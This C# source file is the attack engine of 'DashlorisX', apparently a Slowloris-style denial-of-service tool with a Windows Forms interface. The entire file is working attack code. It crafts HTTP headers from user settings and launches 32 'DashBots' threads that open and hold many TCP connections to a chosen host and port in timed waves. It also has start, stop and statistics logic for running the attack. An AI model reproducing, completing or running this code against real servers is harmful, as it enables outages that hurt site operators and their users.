// Author: Dashie
// Version: 1.0
//
// <description>
//

using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text;
using System.Drawing;
using System.Threading;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Collections.Generic;

using DashlorisX.Properties;

namespace DashlorisX
{ 
    public class PowerPoint
    {
	readonly AttackLog LogLog = new AttackLog();
	readonly DashNet DashNet = new DashNet();

	private void LogSend(string text) =>
	    LogLog.TextLog.AppendText($"{text}\r\n");

	private string host = string.Empty;
	private string port = string.Empty;

	private Socket GetStocking()
	{
	    try
	    {
		return (new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
		    { LingerState = new LingerOption(true, 0), Ttl = 255, SendTimeout = 0, ReceiveTimeout = 0, NoDelay = true });
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}
	private void SetKeepAlive(bool Enable)
	{
	    KeepAlive = (Enable);
	}

	private bool KeepAlive = false;

	private string GetDashlorisHeader()
	{
	    try
	    {
		var version = Settings.HTTPvBox.Text;
		var method = Settings.MethodBox.Text;

		var host = DashlorisX.HostTextBox.Text;

		if (host.Contains("http://") || host.Contains("https://"))
		{
		    host = host.ToLower().Replace("http://", "").Replace("https://", "");
		}

		var useragent = Settings.UserAgentBox.Text;
		var cookie = Settings.CookieBox.Text;

		var bytes = DashlorisX.BytesTextBox.Text;

		string Optionals()
		{
		    if (method == "POST")
		    {
			return string.Format
			(
			    "Accept-Encoding: gzip, deflate\r\n" +
			    "Upgrade-Insecure-Requests: 1\r\n"
			);
		    }

		    return string.Empty;
		}

		return string.Format(
		    $"@1 / @2\r\n".Replace("@1", method).Replace("@2", version) +
		    $"Host: @\r\n".Replace("@", host) +
		    $"Content-Length: @\r\n".Replace("@", bytes) +
		    $"User-Agent: @\r\n".Replace("@", useragent) +
		    $"{Optionals()}\r\n" +
		    $"Cookie: @\r\n\r\n".Replace("@", cookie.Replace(" ", ""))
		);
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}

	private void SendHeader(Socket stocking)
	{
	    try
	    {
		var result = stocking.BeginConnect(host, DashNet.GetInteger(port), null, null);
		var success = result.AsyncWaitHandle.WaitOne(500, true);

		if (stocking.Connected)
		{
		    stocking.Send(Encoding.ASCII.GetBytes(GetDashlorisHeader()));
		}
	    }

	    catch
	    {
		return;
	    }
	}

	readonly Dictionary<string, int> Statistics = new Dictionary<string, int>() { { "Bots", 0 }, { "Connections", 0 } };

	private void UpdateStatistics(string Key, int Value)
	{
	    try
	    {
		if (!Statistics.ContainsKey(Key))
		{
		    Statistics.Add(Key, Value);
		}

		else
		{
		    Statistics[Key] = Value;
		}
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}

	private int GetStatistics(string Key)
	{
	    try
	    {
		if (Statistics.ContainsKey(Key))
		{
		    return Statistics[Key];
		}

		return -1;
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}

	private void ResetStatistics()
	{
	    try
	    {
		UpdateStatistics("Connections", 0);
		UpdateStatistics("Bots", 0);
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}

	private System.Timers.Timer DashTimer = null;

	private void StartDashTimer()
	{
	    try
	    {
		var interval = DashNet.GetInteger(DashlorisX.DurationTextBox.Text);

		DashTimer = new System.Timers.Timer(interval * 1000)
		{
		    AutoReset = false,
		    Enabled = true,
		};

		DashTimer.Elapsed += (s, e) =>
		{
		    StopAttack();
		};

		DashTimer.Start();
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}

	private void StartDashBots()
	{
	    try
	    {
		new Thread(() =>
		{
		    var Stockings = new List<Socket>();
		    var DashBots = new List<Thread>();

		    for (int k = 0; k < 32; k += 1)//worker integration
		    {
			if (KeepAlive)
			{
			    DashBots.Add(new Thread(() =>
			    {
				while (KeepAlive)
				{
				    for (int request = 0; request < 64; request += 1)
				    {
					if (KeepAlive)
					{
					    Socket Stocking = GetStocking();

					    for (int multiplier = 0; multiplier < 4; multiplier += 1, Stocking = GetStocking())
					    {
						SendHeader(Stocking);

						if (Stocking.Connected)
						{
						    UpdateStatistics("Connections", Stockings.Count);// Inner Iteration to see how many connections alive, for accuracy.
						    Stockings.Add(Stocking);

						    continue;
						}

						Stocking.Dispose();
					    }

					    Thread.Sleep(2000); // Inner Interval
					    continue;
					}

					break;
				    }

				    if (KeepAlive)
				    {
					Thread.Sleep(8000); // Main Interval
				    }
				}
			    }));

			    UpdateStatistics("Bots", k + 1);
			}
		    }

		    foreach (var DashBot in DashBots)
		    {
			if (KeepAlive)
			{
			    DashBot.IsBackground = true;
			    DashBot.Start();

			    Thread.Sleep(500); // Worker Startup Interval
			}
		    }

		    foreach (var DashBot in DashBots)
		    {
			if (KeepAlive)
			{
			    DashBot.Join();
			}
		    }

		    foreach (var Stocking in Stockings)
		    {
			if (Stocking.Connected)
			{
			    Stocking.Close();
			}

			Stocking.Dispose();
		    }
		})

		{ IsBackground = true }.Start();
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}

	public void StartAttack()
	{
	    try
	    {
		port = DashNet.GetPort(DashlorisX.PortTextBox.Text).ToString();
		host = DashNet.GetIP(DashlorisX.HostTextBox.Text);

		LogSend("Starting Dash Bots ...."); // Display amount of specified bots

		SetKeepAlive(true);
		StartDashBots();
		StartDashTimer();

		LogSend("Sending waves and waves of Dashloris-X Requests ....");

		LogLog.ShowDialog();
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}

	private void StartSafeTimer()
	{
	    var SafeTimer = new System.Timers.Timer(5000)
	    {
		AutoReset = false,
	    };

	    SafeTimer.Elapsed += (s, e) =>
	    {
		DashlorisX.Launch.Text = string.Format("Launch"); ;
		LogLog.Stop.Text = string.Format("Stop");
		LogLog.Hide();
	    };

	    SafeTimer.Start();
	}

	public void StopAttack()
	{
	    DashlorisX.Launch.Text = "Stopping ....";

	    try
	    {
		LogSend($"Stop signal received, stopping {GetStatistics("Bots")} bots and disconnecting {GetStatistics("Connections")} connections ....");

		if (GetStatistics("Bots") > 8 || GetStatistics("Connections") > 132)
		{
		    LogSend("Please wait a moment, this may take a second ....");
		}

		SetKeepAlive(false);

		if (DashTimer != null)
		{
		    if (DashTimer.Enabled)
		    {
			DashTimer.Stop();
			DashTimer = null;
		    }
		}

		StartSafeTimer();
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}
    }
}
